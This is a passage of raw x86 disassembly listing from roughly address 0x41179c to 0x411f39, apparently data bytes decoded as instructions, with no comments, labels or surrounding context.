  41179c:	and    al,BYTE PTR [eax]
  41179e:	add    DWORD PTR [eax+0x1c004920],eax
  4117a4:	xchg   ebx,eax
  4117a5:	lar    eax,WORD PTR [ecx-0x70]
  4117a9:	sbb    BYTE PTR [eax-0x4f4fff6c],al
  4117af:	add    DWORD PTR [eax],eax
  4117b1:	add    al,al
  4117b3:	mov    BYTE PTR [ecx],al
  4117b5:	adc    BYTE PTR [ebx+edx*1+0x78],ah
  4117b9:	nop
  4117ba:	adc    al,0x41
  4117bc:	and    ecx,DWORD PTR [eax+edx*1]
  4117bf:	pusha  
  4117c0:	cmp    esp,DWORD PTR [eax]
  4117c2:	inc    esp
  4117c3:	inc    eax
  4117c4:	add    BYTE PTR [eax+0x6],al
  4117c7:	and    BYTE PTR [eax+0x60],0x42
  4117cb:	add    BYTE PTR [eax],dl
  4117cd:	retf   
  4117ce:	sub    BYTE PTR [eax-0x1],ah
  4117d1:	adc    eax,0x421c14
  4117d6:	lar    ecx,WORD PTR [edx+ecx*4]
  4117da:	inc    eax
  4117db:	inc    eax
  4117dc:	loope  0x41177f
  4117de:	add    BYTE PTR [eax],al
  4117e0:	xor    DWORD PTR [eax],eax
  4117e2:	add    BYTE PTR [esp+ecx*1+0xa],0xc6
  4117e7:	sbb    al,0x0
  4117e9:	or     DWORD PTR [eax],eax
  4117eb:	xor    BYTE PTR [eax],bh
  4117ed:	adc    DWORD PTR [ecx],0x10021423
  4117f3:	and    cl,BYTE PTR [eax+0x2a]
  4117f6:	pushf  
  4117f7:	add    DWORD PTR [eax+0x0],eax
  4117fa:	inc    ebx
  4117fb:	rol    DWORD PTR [esi+0x46],0x0
  4117ff:	out    0xe6,al
  411801:	mov    al,ds:0x80069389
  411806:	add    al,0x2c
  411808:	add    BYTE PTR [eax],0x18
  41180b:	or     BYTE PTR [edx+0x205000],bl
  411811:	sub    BYTE PTR [edx],al
  411813:	inc    esp
  411814:	nop
  411815:	lds    ecx,FWORD PTR [eax-0x7af7d000]
  41181b:	push   esp
  41181c:	mov    al,0xb
  41181e:	mov    bl,0x9
  411820:	shl    BYTE PTR [ebx],1
  411822:	inc    ecx
  411823:	loop   0x4117bd
  411825:	add    DWORD PTR [ecx],eax
  411827:	sub    BYTE PTR [edx],cl
  411829:	and    ah,BYTE PTR [edx+0x20010005]
  41182f:	inc    ebp
  411830:	add    BYTE PTR [ebx+eax*1],al
  411833:	xor    al,0x2
  411835:	inc    esp
  411836:	add    BYTE PTR [eax+eiz*4+0x41a81002],ah
  41183d:	dec    esi
  41183e:	add    BYTE PTR [eax],al
  411840:	pop    ecx
  411841:	and    BYTE PTR [ecx-0x7c],al
  411844:	add    al,BYTE PTR [eax+eax*4+0xd]
  411848:	add    BYTE PTR [ecx],dl
  41184a:	xor    BYTE PTR [edx+0x1a],ah
  41184d:	add    BYTE PTR [eax+eax*4],dl
  411850:	dec    ebx
  411851:	mov    WORD PTR ds:0x4904820,es
  411857:	pusha  
  411858:	adc    BYTE PTR [eax],al
  41185a:	add    eax,0xa8888890
  41185f:	and    BYTE PTR [eax+0x48804005],0x0
  411866:	or     BYTE PTR [eax+0x2005d000],bl
  41186c:	add    al,0xb0
  41186e:	mov    BYTE PTR [eax],ch
  411870:	or     BYTE PTR [eax-0x3f77ffed],al
  411876:	add    al,0x4
  411878:	and    al,BYTE PTR [edx+0x2ec1400]
  41187e:	xchg   DWORD PTR [eax+0x58],esi
  411881:	or     BYTE PTR [eax+0x24006001],al
  411887:	xchg   esp,eax
  411888:	inc    eax
  411889:	popa   
  41188a:	and    eax,DWORD PTR [edx]
  41188c:	test   BYTE PTR [eax+0xe92202d],al
  411892:	sbb    BYTE PTR [ebp-0x3e],ah
  411895:	dec    eax
  411896:	adc    BYTE PTR [ecx+0x50],al
  411899:	adc    BYTE PTR [ecx+0x2102008],al
  41189f:	imul   eax,DWORD PTR [ecx],0x500a9280
  4118a5:	adc    BYTE PTR [eax+0xe],ah
  4118a8:	nop
  4118a9:	enter  0x4549,0x2c
  4118ad:	add    BYTE PTR [esi+0x15],al
  4118b0:	add    BYTE PTR [eax],bh
  4118b2:	add    al,0x4
  4118b4:	and    DWORD PTR [eax],eax
  4118b6:	add    eax,0xc0019800
  4118bb:	add    esi,DWORD PTR [eax+ecx*1+0x6130188]
  4118c2:	add    DWORD PTR [eax+0x3022284],eax
  4118c8:	add    DWORD PTR [esi],0x0
  4118cb:	push   es
  4118cc:	add    al,0x18
  4118ce:	add    al,0x1
  4118d0:	pop    esp
  4118d1:	add    BYTE PTR [ebx+0x34],ch
  4118d4:	add    BYTE PTR [eax],cl
  4118d6:	inc    eax
  4118d7:	add    ah,BYTE PTR [eax]
  4118d9:	hlt    
  4118da:	mov    cl,BYTE PTR [edx+ebx*1]
  4118dd:	jp     0x411867
  4118df:	or     al,BYTE PTR [eax-0x80]
  4118e2:	dec    ecx
  4118e3:	and    BYTE PTR [eax],al
  4118e5:	add    DWORD PTR [ecx],esp
  4118e7:	add    BYTE PTR [eax],al
  4118e9:	fcom   DWORD PTR [eax]
  4118eb:	xor    eax,0x30463520
  4118f0:	mov    al,0x80
  4118f2:	adc    dl,BYTE PTR [eax]
  4118f4:	inc    eax
  4118f5:	add    al,0x0
  4118f7:	add    BYTE PTR [eax],al
  4118f9:	mov    BYTE PTR [ebp+0x20],ah
  4118fc:	add    BYTE PTR [eax-0x5f65e5b0],dl
  411902:	and    BYTE PTR [ecx+ecx*1],0x18
  411906:	push   es
  411907:	and    al,BYTE PTR [eax]
  411909:	and    eax,0x1280b40
  41190e:	mov    BYTE PTR [eax],cl
  411910:	and    al,0x74
  411912:	loop   0x411934
  411914:	pusha  
  411915:	xor    esi,ecx
  411917:	add    BYTE PTR [esp+eax*2+0x20],0x0
  41191c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41191d:	adc    BYTE PTR [eax],dl
  41191f:	add    BYTE PTR [eax],al
  411921:	adc    BYTE PTR [eax+0x20c600],bl
  411927:	add    BYTE PTR [eax+0x810e340],al
  41192d:	shl    BYTE PTR [ecx+0x3c],0x8c
  411931:	inc    ecx
  411932:	or     DWORD PTR [eax+0x42a1847f],eax
  411938:	dec    ebp
  411939:	add    BYTE PTR [eax+0x0],ah
  41193c:	mov    dl,0x48
  41193e:	adc    eax,0x46255423
  411943:	xor    BYTE PTR [eax+0x41],0x0
  411947:	and    BYTE PTR [ecx+0x0],dh
  41194a:	sbb    al,ah
  41194c:	inc    ecx
  41194d:	add    BYTE PTR [ecx-0x1ffdedf8],al
  411953:	nop
  411954:	add    BYTE PTR [ecx+eiz*1],al
  411957:	add    BYTE PTR [ecx+0x6121aa15],0x29
  41195e:	add    BYTE PTR [eax],al
  411960:	sub    BYTE PTR [ebx-0x3ffeffcf],al
  411966:	pusha  
  411967:	or     BYTE PTR [eax],0x10
  41196a:	adc    BYTE PTR [edx+0x1d528480],0xe1
  411971:	pusha  
  411972:	xchg   ecx,eax
  411973:	add    DWORD PTR [eax+0x2404518],ecx
  411979:	and    BYTE PTR [eax+edx*2],cl
  41197c:	pop    edx
  41197d:	mov    BYTE PTR [ebx],al
  41197f:	add    BYTE PTR [eax],cl
  411981:	adc    eax,0x80600801
  411986:	mov    al,ds:0x21a80720
  41198b:	mov    WORD PTR [edi],es
  41198d:	mov    dl,0x55
  41198f:	add    DWORD PTR [ebx+0x26420c8],edi
  411995:	dec    eax
  411996:	xor    BYTE PTR [ebx+ebp*1-0x7f7ffbfa],0x82
  41199e:	sbb    BYTE PTR [esp+ebp*1],al
  4119a1:	add    DWORD PTR [eax],eax
  4119a3:	add    BYTE PTR [esi+ecx*1],dl
  4119a6:	add    ecx,eax
  4119a8:	ret    0x8000
  4119ab:	mov    al,ds:0x4100cb
  4119b0:	add    al,0x81
  4119b2:	add    DWORD PTR [edx],eax
  4119b4:	add    BYTE PTR [ecx],ch
  4119b6:	and    BYTE PTR [eax],al
  4119b8:	loopne 0x41194a
  4119ba:	or     BYTE PTR [eax],bl
  4119bc:	add    BYTE PTR [eax],cl
  4119be:	add    BYTE PTR [ebx],ch
  4119c0:	rol    BYTE PTR [edx],0x88
  4119c3:	inc    eax
  4119c4:	or     BYTE PTR [eax],cl
  4119c6:	mov    al,ds:0x1c248140
  4119cb:	cmp    eax,DWORD PTR [eax]
  4119cd:	adc    esp,DWORD PTR [edx+0x5]
  4119d0:	out    dx,al
  4119d1:	sub    BYTE PTR [ebx],dl
  4119d3:	add    ah,BYTE PTR [esp]
  4119d6:	and    BYTE PTR [edx+0x1],bl
  4119d9:	or     ah,BYTE PTR [eax-0x6e39237d]
  4119df:	mov    BYTE PTR [eax],al
  4119e1:	inc    BYTE PTR [edx+0x8200a21]
  4119e7:	adc    DWORD PTR [eax],edx
  4119e9:	scas   al,BYTE PTR es:[edi]
  4119ea:	outs   dx,DWORD PTR ds:[esi]
  4119eb:	pop    eax
  4119ec:	or     BYTE PTR [edx],ah
  4119ee:	mov    ch,0x42
  4119f0:	add    BYTE PTR [eax],0xa
  4119f3:	push   esp
  4119f4:	sub    BYTE PTR [eax],0x95
  4119f7:	add    al,0xe
  4119f9:	inc    esi
  4119fa:	add    eax,0x404ac842
  4119ff:	and    DWORD PTR [edx],0x12004080
  411a05:	add    BYTE PTR [esp+edx*2],al
  411a08:	call   0xb140:0xab100c83
  411a0f:	pusha  
  411a10:	sub    BYTE PTR [esi],al
  411a12:	add    BYTE PTR [eax],ch
  411a14:	and    BYTE PTR [eax],al
  411a16:	and    bh,BYTE PTR [eax]
  411a18:	xchg   BYTE PTR [eax],dl
  411a1a:	add    BYTE PTR [ecx],al
  411a1c:	add    eax,0x119a0940
  411a21:	adc    BYTE PTR [edx],dh
  411a23:	inc    eax
  411a24:	add    al,0x4
  411a26:	dec    esp
  411a27:	add    BYTE PTR [eax-0x1fa5fd4d],ah
  411a2d:	add    ah,BYTE PTR [edi+0x22]
  411a30:	add    BYTE PTR [eax+0x109c0000],bh
  411a36:	push   cs
  411a37:	jb     0x4119b9
  411a39:	dec    ebp
  411a3a:	add    DWORD PTR [eax+eiz*4+0x60],esp
  411a3e:	inc    eax
  411a3f:	les    eax,FWORD PTR [edx+0xd24c085]
  411a45:	xchg   edx,eax
  411a46:	xor    BYTE PTR [edx],al
  411a48:	xor    DWORD PTR es:[eax+0x71d4a04],edi
  411a4f:	add    al,0x89
  411a51:	add    DWORD PTR [eax],eax
  411a53:	adc    BYTE PTR [eax+0x240842],al
  411a59:	adc    BYTE PTR [eax-0x2f],0x90
  411a5d:	sub    BYTE PTR [eax+0x68],0x21
  411a61:	and    BYTE PTR [eax-0x1e7eebc0],cl
  411a67:	bound  eax,QWORD PTR [ecx]
  411a69:	add    BYTE PTR [eax+0x18458541],ch
  411a6f:	add    DWORD PTR [eax+0x2ad6049a],edx
  411a75:	inc    eax
  411a76:	popa   
  411a77:	inc    esp
  411a78:	add    DWORD PTR [eax+0x48],0x40991540
  411a7f:	add    DWORD PTR [eax+eax*2+0x44a04400],ebx
  411a86:	mov    WORD PTR [edx],es
  411a88:	adc    BYTE PTR [eax+0x68],ah
  411a8b:	inc    esp
  411a8c:	or     al,0x0
  411a8e:	or     al,0x40
  411a90:	add    BYTE PTR [eax],al
  411a92:	add    dl,bh
  411a94:	and    BYTE PTR [ecx+eax*2],al
  411a97:	test   BYTE PTR [eax],al
  411a99:	push   ecx
  411a9a:	add    BYTE PTR [eax+eiz*4],dl
  411a9d:	mov    BYTE PTR [edx],ah
  411a9f:	adc    BYTE PTR [ecx+edi*1+0x840028],al
  411aa6:	popa   
  411aa7:	add    BYTE PTR [eax-0x1f],ah
  411aaa:	and    BYTE PTR [eax-0x40],0x0
  411aae:	ret    0x201
  411ab1:	les    eax,FWORD PTR [edx+ebp*1]
  411ab4:	add    BYTE PTR [eax-0x78],0xe
  411ab8:	ins    BYTE PTR es:[edi],dx
  411ab9:	ret    0xb000
  411abc:	inc    edx
  411abd:	cmp    DWORD PTR [ecx+ebp*2],eax
  411ac0:	add    cl,BYTE PTR [esi]
  411ac2:	add    BYTE PTR [ecx-0x2b1f7ed9],al
  411ac8:	add    BYTE PTR [eax+eiz*1],dh
  411acb:	mov    ecx,0x808004d
  411ad0:	inc    ecx
  411ad1:	enter  0x40,0x24
  411ad5:	call   0x1100:0x910b9140
  411adc:	sub    al,0x11
  411ade:	loopne 0x411a60
  411ae0:	and    BYTE PTR [eax],ah
  411ae2:	or     BYTE PTR [ecx-0x762c0000],al
  411ae8:	add    BYTE PTR [eax-0x7fa3ffd8],dh
  411aee:	adc    cl,BYTE PTR [eax]
  411af0:	inc    eax
  411af1:	xchg   ecx,eax
  411af2:	add    BYTE PTR [esi],0x40
  411af5:	and    dl,BYTE PTR [eax-0x39e90000]
  411afb:	and    al,0xa
  411afd:	cmp    BYTE PTR [ecx+0x26],al
  411b00:	add    eax,0x700810b
  411b05:	xor    cl,BYTE PTR [eax+0x200823]
  411b0b:	mov    al,0x8
  411b0d:	add    BYTE PTR [edx+0x11],al
  411b10:	sbb    BYTE PTR [esi+0x28819050],cl
  411b16:	and    DWORD PTR [ecx],esi
  411b18:	and    BYTE PTR [eax+0x0],al
  411b1b:	or     BYTE PTR [eax],ch
  411b1d:	add    DWORD PTR [eax-0xd],eax
  411b20:	push   ds
  411b21:	add    cl,BYTE PTR [esi+eax*1]
  411b24:	or     al,0x4
  411b26:	or     BYTE PTR [eax-0x7f5e7ebc],al
  411b2c:	pusha  
  411b2d:	and    BYTE PTR [edx-0x6d],0x10
  411b31:	aaa    
  411b32:	pop    edx
  411b33:	add    BYTE PTR [eax-0x5672ffdf],al
  411b39:	pusha  
  411b3a:	jo     0x411b3c
  411b3c:	loop   0x411b7e
  411b3e:	add    al,BYTE PTR [edx-0x80]
  411b41:	add    DWORD PTR [ebp+0x2],esp
  411b44:	add    DWORD PTR [ecx+eax*1],ebp
  411b47:	add    BYTE PTR [edx],bl
  411b49:	or     bl,BYTE PTR [eax+eax*8]
  411b4c:	inc    ecx
  411b4d:	add    BYTE PTR [eax],al
  411b4f:	sub    al,BYTE PTR [eax]
  411b51:	or     al,0x8
  411b53:	xor    al,ah
  411b55:	inc    ecx
  411b56:	test   al,0x4
  411b58:	add    dl,bl
  411b5a:	adc    BYTE PTR [edx],cl
  411b5c:	sub    BYTE PTR [eax+0x38],ch
  411b5f:	add    al,0x44
  411b61:	enter  0x8080,0x13
  411b65:	adc    BYTE PTR [eax+0x20],dl
  411b68:	sbb    al,0x47
  411b6a:	add    DWORD PTR [edx],ecx
  411b6c:	xchg   ecx,eax
  411b6d:	and    DWORD PTR ds:0x80880020,esp
  411b73:	xchg   esp,eax
  411b74:	xchg   DWORD PTR [eax],eax
  411b76:	add    al,0x40
  411b78:	add    ebx,DWORD PTR [eax]
  411b7a:	sub    DWORD PTR [eax+0x11],0x10916851
  411b81:	inc    eax
  411b82:	pop    esi
  411b83:	sub    BYTE PTR [eax],al
  411b85:	add    BYTE PTR [edx],bl
  411b87:	xchg   esp,eax
  411b88:	inc    esp
  411b89:	add    DWORD PTR [edx],esi
  411b8b:	mov    al,0xa
  411b8d:	shr    BYTE PTR [esi+0x2200508],0x29
  411b94:	add    DWORD PTR [ecx+edx*2],0x40204103
  411b9b:	inc    ecx
  411b9c:	cmp    BYTE PTR [ecx],dl
  411b9e:	add    dh,0x20
  411ba1:	rcl    BYTE PTR [eax+ecx*1+0x53082122],1
  411ba8:	pop    es
  411ba9:	add    al,BYTE PTR [esi]
  411bab:	inc    ecx
  411bac:	pusha  
  411bad:	inc    esi
  411bae:	inc    eax
  411baf:	pop    esi
  411bb0:	and    DWORD PTR [eax],edx
  411bb2:	adc    BYTE PTR [ecx],dh
  411bb4:	adc    al,0x1
  411bb6:	stos   BYTE PTR es:[edi],al
  411bb7:	inc    esp
  411bb8:	cwde   
  411bb9:	rol    al,0x60
  411bbc:	and    al,0x18
  411bbe:	push   eax
  411bbf:	rol    DWORD PTR [eax],1
  411bc1:	inc    esi
  411bc2:	rol    BYTE PTR [ecx+eiz*1],0xc9
  411bc6:	add    BYTE PTR [eax],cl
  411bc8:	sub    BYTE PTR [edx],cl
  411bca:	sub    eax,eax
  411bcc:	and    al,BYTE PTR [eax+0x40]
  411bcf:	add    DWORD PTR [eax-0x80],0x0
  411bd3:	xchg   edx,eax
  411bd4:	dec    eax
  411bd5:	inc    ecx
  411bd6:	pop    esp
  411bd7:	nop
  411bd8:	bound  eax,QWORD PTR [edx]
  411bda:	and    BYTE PTR [edx+0xb],al
  411bdd:	mov    BYTE PTR [ecx],ah
  411bdf:	and    BYTE PTR [eax+0x2],0x88
  411be3:	mov    BYTE PTR es:[eax],al
  411be6:	adc    DWORD PTR [eax],ecx
  411be8:	and    cl,BYTE PTR [edx+0x2a]
  411beb:	add    eax,eax
  411bed:	inc    ecx
  411bee:	push   eax
  411bef:	add    DWORD PTR [ecx-0x2f],0x23240341
  411bf6:	add    DWORD PTR [ecx],0x1
  411bf9:	adc    al,0x88
  411bfb:	add    BYTE PTR [eax],ah
  411bfd:	inc    ecx
  411bfe:	dec    eax
  411bff:	popa   
  411c00:	ins    DWORD PTR es:[edi],dx
  411c01:	and    eax,0x92050400
  411c06:	mov    WORD PTR [eax+ecx*2],ds
  411c09:	sub    BYTE PTR [eax],dl
  411c0b:	inc    edx
  411c0c:	add    BYTE PTR [eax+0x401040a],al
  411c12:	mov    BYTE PTR [eax+0x0],dl
  411c15:	js     0x411c3e
  411c17:	xchg   edx,eax
  411c18:	push   es
  411c19:	and    eax,0xc614881
  411c1e:	mov    BYTE PTR [eax+ebp*1],bh
  411c21:	sub    DWORD PTR [eax],ecx
  411c23:	inc    edx
  411c24:	inc    ecx
  411c25:	adc    al,0x20
  411c27:	inc    ebp
  411c28:	sub    eax,DWORD PTR [eax]
  411c2a:	add    eax,edi
  411c2c:	rcr    BYTE PTR [ecx],0x20
  411c2f:	mov    BYTE PTR [eax-0x7c],al
  411c32:	pop    edx
  411c33:	or     BYTE PTR [eax+0x21583088],dl
  411c39:	add    BYTE PTR [esi+eax*4+0x6],dl
  411c3d:	mov    BYTE PTR [eax],dl
  411c3f:	add    BYTE PTR [eax+0x20],al
  411c42:	add    DWORD PTR [ecx+0x40],eax
  411c45:	les    esp,FWORD PTR [edx]
  411c47:	inc    ecx
  411c48:	jo     0x411c4c
  411c4a:	ret    0xc545
  411c4d:	xchg   esp,eax
  411c4e:	add    DWORD PTR [eax],edx
  411c50:	mov    BYTE PTR [ecx],cl
  411c52:	int3   
  411c53:	dec    eax
  411c54:	add    BYTE PTR [eax],al
  411c56:	shl    esp,1
  411c58:	test   BYTE PTR [edx],al
  411c5a:	add    al,0x41
  411c5c:	cli    
  411c5d:	add    BYTE PTR [eax],0x10
  411c60:	or     eax,DWORD PTR [eax+0x68026020]
  411c66:	mov    es,WORD PTR [esi+0x50]
  411c69:	xor    al,0xd0
  411c6b:	adc    DWORD PTR [edx+0x61],0x404a480
  411c72:	loop   0x411ca4
  411c74:	add    DWORD PTR [eax-0x57f7f7f8],eax
  411c7a:	mov    BYTE PTR [eax+0x4],ah
  411c7d:	add    al,BYTE PTR [ecx]
  411c7f:	add    DWORD PTR [eax],eax
  411c81:	and    DWORD PTR [eax+0xc160532],0x9
  411c88:	add    BYTE PTR [edx+0x20844021],al
  411c8e:	xor    al,0x23
  411c90:	adc    DWORD PTR [edx-0x5f6ff6ff],eax
  411c96:	nop
  411c97:	add    BYTE PTR [ecx+0x25],dl
  411c9a:	inc    ecx
  411c9b:	retf   
  411c9c:	and    BYTE PTR [eax+0x25],ah
  411c9f:	retf   
  411ca0:	or     BYTE PTR [edx],ah
  411ca2:	xchg   ebp,eax
  411ca3:	add    BYTE PTR [eax],al
  411ca5:	add    BYTE PTR [ebx+0x6b219030],cl
  411cab:	push   0x1a288000
  411cb0:	inc    ebp
  411cb1:	and    BYTE PTR [eax+0x3a],al
  411cb4:	lds    edx,FWORD PTR [esp]
  411cb7:	jno    0x411c79
  411cb9:	and    BYTE PTR [ecx],bl
  411cbb:	test   BYTE PTR [ecx],cl
  411cbd:	int3   
  411cbe:	dec    eax
  411cbf:	pusha  
  411cc0:	adc    bh,BYTE PTR [eax+eax*8]
  411cc3:	adc    BYTE PTR [eax+0x8],al
  411cc6:	add    esp,DWORD PTR [ecx+0x0]
  411cc9:	cmp    al,0x84
  411ccb:	inc    ebp
  411ccc:	add    BYTE PTR [ecx+0x48],al
  411ccf:	add    DWORD PTR [eax],eax
  411cd1:	mov    BYTE PTR [esi+eax*4+0x58],al
  411cd5:	add    BYTE PTR [eax],bl
  411cd7:	arpl   ax,dx
  411cd9:	sbb    BYTE PTR [eax],al
  411cdb:	or     BYTE PTR [eax+0x108655c],0x2
  411ce2:	inc    esi
  411ce3:	adc    al,0x80
  411ce5:	and    BYTE PTR [eax],dl
  411ce7:	add    eax,0x42c88031
  411cec:	sbb    al,BYTE PTR [eax]
  411cee:	inc    eax
  411cef:	add    BYTE PTR [edx+ebx*1-0x20],ah
  411cf3:	xor    BYTE PTR [eax],dl
  411cf5:	mov    WORD PTR [ecx-0x77bf6d38],es
  411cfb:	test   BYTE PTR [eax],ah
  411cfd:	add    BYTE PTR [eax],al
  411cff:	shl    BYTE PTR [eax],1
  411d01:	add    DWORD PTR [eax+eax*2],esp
  411d04:	push   es
  411d05:	rol    BYTE PTR [ecx],1
  411d07:	or     BYTE PTR [ecx+edi*1+0x8],ah
  411d0b:	sub    BYTE PTR [eax-0x669e7ae4],dh
  411d11:	add    eax,DWORD PTR [eax]
  411d13:	lds    eax,FWORD PTR [eax]
  411d15:	dec    esp
  411d16:	add    BYTE PTR [eax],dh
  411d18:	adc    BYTE PTR [eax],ch
  411d1a:	rol    BYTE PTR [eax],1
  411d1c:	add    DWORD PTR [eax-0x7df5b356],ecx
  411d22:	or     BYTE PTR [eax-0x4a386e74],dh
  411d28:	add    al,0xc6
  411d2a:	mov    BYTE PTR [edx-0x40],ah
  411d2d:	sbb    BYTE PTR [eax],dh
  411d2f:	inc    edx
  411d30:	push   0x216821a2
  411d35:	add    BYTE PTR [ebx],al
  411d37:	dec    eax
  411d38:	sub    BYTE PTR [esi],dl
  411d3a:	or     BYTE PTR [eax+0x4],al
  411d3d:	or     al,0x9
  411d3f:	add    BYTE PTR [eax],al
  411d41:	xchg   ebp,eax
  411d42:	and    al,0x3
  411d44:	add    DWORD PTR [edx],0x0
  411d47:	test   BYTE PTR [eax+0x1],ah
  411d4a:	push   eax
  411d4b:	add    cl,BYTE PTR [ecx]
  411d4d:	and    BYTE PTR [ecx+0x929822],ah
  411d53:	push   es
  411d54:	ret    0xe03c
  411d57:	add    dl,BYTE PTR [edx]
  411d59:	add    BYTE PTR [ebp+0x54],al
  411d5c:	and    edx,DWORD PTR [edx+ebx*1]
  411d5f:	or     BYTE PTR [eax],al
  411d61:	and    eax,0x258811c1
  411d66:	add    al,BYTE PTR [eax]
  411d68:	push   eax
  411d69:	xor    BYTE PTR [ecx-0x7be5f440],0xe
  411d70:	jo     0x411d72
  411d72:	push   esi
  411d73:	sahf   
  411d74:	inc    edx
  411d75:	fs adc al,0x44
  411d78:	push   edx
  411d79:	inc    eax
  411d7a:	adc    DWORD PTR [eax],eax
  411d7c:	push   esp
  411d7d:	or     BYTE PTR [eax],0x8
  411d80:	inc    eax
  411d81:	sub    al,BYTE PTR [edi]
  411d83:	mov    ds:0xa0103036,al
  411d88:	mov    ds:0x1c601108,al
  411d8d:	sub    BYTE PTR [edx],0x13
  411d90:	add    BYTE PTR [ecx+0x4],cl
  411d93:	dec    edx
  411d94:	add    BYTE PTR ds:0x8c14440,cl
  411d9a:	sbb    BYTE PTR [eax],cl
  411d9c:	adc    DWORD PTR [eax+0x3220485],ebx
  411da2:	adc    ah,BYTE PTR [eax+0x4c96401]
  411da8:	or     DWORD PTR [ecx],ebp
  411daa:	cmp    ch,BYTE PTR [eax]
  411dac:	jo     0x411d72
  411dae:	or     BYTE PTR [eax],0x81
  411db1:	mov    ah,0xd0
  411db3:	mov    al,ds:0xe4243298
  411db8:	or     al,BYTE PTR [esp]
  411dbb:	add    BYTE PTR [ebx-0x7e96ff6e],0x4a
  411dc2:	adc    BYTE PTR [esp+eiz*4-0x6a],al
  411dc6:	dec    ecx
  411dc7:	rol    BYTE PTR [edx+eiz*4+0x60300001],0x68
  411dcf:	popa   
  411dd0:	sbb    DWORD PTR [ecx],eax
  411dd2:	sbb    DWORD PTR [edx+0x2b],eax
  411dd5:	and    BYTE PTR [eax],cl
  411dd7:	add    BYTE PTR [eax+0x4],0x1
  411ddb:	xor    DWORD PTR [edx-0x7c],0x45910006
  411de2:	or     BYTE PTR [ecx+0x1],al
  411de5:	adc    ah,BYTE PTR [ebx+eax*2]
  411de8:	arpl   WORD PTR [esp+ecx*1],dx
  411deb:	add    BYTE PTR [ecx],al
  411ded:	and    dh,al
  411def:	pusha  
  411df0:	push   0xe
  411df2:	or     cl,BYTE PTR [esi]
  411df4:	add    al,BYTE PTR [esi]
  411df6:	add    BYTE PTR [ecx],al
  411df8:	add    BYTE PTR [eax+0x525100],al
  411dfe:	adc    al,0xf2
  411e00:	or     BYTE PTR [eax],ch
  411e02:	add    cl,al
  411e04:	inc    ecx
  411e05:	or     dh,BYTE PTR [eax+0x8100802]
  411e0b:	gs inc esi
  411e0d:	test   BYTE PTR [ecx],dl
  411e0f:	add    al,0x68
  411e11:	dec    eax
  411e12:	and    BYTE PTR [ecx],0x0
  411e15:	add    BYTE PTR [eax+0x20075088],al
  411e1b:	pop    es
  411e1c:	and    BYTE PTR [eax-0x40],0xb2
  411e20:	inc    eax
  411e21:	and    BYTE PTR [esi],ch
  411e23:	push   ecx
  411e24:	jo     0x411e96
  411e26:	sub    al,0x41
  411e28:	inc    ecx
  411e29:	gs jo  0x411e6c
  411e2c:	lea    esp,[eax-0x5ffaf7f0]
  411e32:	xchg   DWORD PTR [ecx+0x4],ebp
  411e35:	push   0xb0012e50
  411e3a:	test   BYTE PTR ds:0x10401403,dh
  411e40:	add    BYTE PTR [eax+0x28],al
  411e43:	pusha  
  411e44:	add    dl,BYTE PTR [ecx]
  411e46:	and    BYTE PTR [eax+0x30540016],dl
  411e4c:	add    al,0x82
  411e4e:	add    BYTE PTR [ebx],0x8
  411e51:	loope  0x411de9
  411e53:	cwde   
  411e54:	add    esp,eax
  411e56:	add    al,0x22
  411e58:	xor    eax,0x8a021131
  411e5d:	sub    BYTE PTR ds:0x34464080,cl
  411e63:	and    BYTE PTR [edx],dl
  411e65:	nop
  411e66:	mov    BYTE PTR [eax],dl
  411e68:	adc    DWORD PTR [eax],ecx
  411e6a:	inc    eax
  411e6b:	add    eax,0x11040824
  411e70:	mov    al,ds:0x95f8081
  411e75:	add    al,BYTE PTR [eax]
  411e77:	or     BYTE PTR [eax],al
  411e79:	xor    DWORD PTR [eax-0x7f],eax
  411e7c:	add    BYTE PTR [ecx+0x0],al
  411e7f:	add    al,0x88
  411e81:	inc    eax
  411e82:	pop    es
  411e83:	add    bl,al
  411e85:	add    al,0x18
  411e87:	nop
  411e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e89:	and    BYTE PTR [eax+0x54a4a51],bl
  411e8f:	and    BYTE PTR [edx-0x2f],ah
  411e92:	adc    BYTE PTR fs:[esi+0x1020e807],al
  411e99:	add    eax,0xc8523584
  411e9e:	jo     0x411ea8
  411ea0:	add    DWORD PTR [edx+0x4],ebp
  411ea3:	sub    al,0x90
  411ea5:	or     BYTE PTR [eax],0xa
  411ea8:	adc    BYTE PTR [ecx],al
  411eaa:	dec    eax
  411eab:	mov    al,0x80
  411ead:	inc    edx
  411eae:	dec    edx
  411eaf:	and    DWORD PTR [ecx],esp
  411eb1:	cmp    BYTE PTR [esi],0x85
  411eb4:	add    BYTE PTR [eax+0x109401c4],dl
  411eba:	rcl    ch,1
  411ebc:	adc    ah,BYTE PTR [ecx]
  411ebe:	mov    al,ds:0x16448b0d
  411ec3:	add    al,0x4
  411ec5:	ror    DWORD PTR [ecx+0x0],1
  411ec8:	and    BYTE PTR [eax],ch
  411eca:	adc    al,BYTE PTR ds:0x8098a85
  411ed0:	add    BYTE PTR [eax-0x4dff7530],0x4a
  411ed7:	or     eax,0x4b8700c0
  411edc:	add    BYTE PTR [eax],ch
  411ede:	inc    ebx
  411edf:	icebp  
  411ee0:	add    al,0x8
  411ee2:	add    BYTE PTR [eax],al
  411ee4:	push   eax
  411ee5:	add    al,0x5
  411ee7:	adc    eax,0x24e08900
  411eec:	dec    eax
  411eed:	and    BYTE PTR [eax],cl
  411eef:	add    BYTE PTR [eax],al
  411ef1:	add    BYTE PTR [eax],al
  411ef3:	add    ecx,ebx
  411ef5:	cmp    dl,BYTE PTR [eax+0x8]
  411ef8:	popa   
  411ef9:	and    BYTE PTR [esi],ch
  411efb:	add    ch,dh
  411efd:	adc    al,0xc1
  411eff:	or     BYTE PTR [esi],al
  411f01:	adc    BYTE PTR [edx+edx*1],0x0
  411f05:	add    BYTE PTR [eax+0x41],ch
  411f08:	inc    edx
  411f09:	mov    BYTE PTR [eax+0x3],ah
  411f0c:	mov    cl,0x92
  411f0e:	xlat   BYTE PTR ds:[ebx]
  411f0f:	xor    al,0xe0
  411f11:	add    DWORD PTR [eax-0x2c],esp
  411f14:	add    BYTE PTR [esp+eax*2],dl
  411f17:	ret    0xe8
  411f1a:	or     BYTE PTR [eax],dl
  411f1c:	push   ss
  411f1d:	add    ecx,DWORD PTR [eax+eax*8+0x20a0682]
  411f24:	or     BYTE PTR [eax+0x40205089],0x24
  411f2b:	xchg   BYTE PTR [eax+ecx*1+0x8b000b5],dl
  411f32:	add    al,0x8a
  411f34:	mov    al,ds:0x180000a
  411f39:	fadd   DWORD PTR [esi]
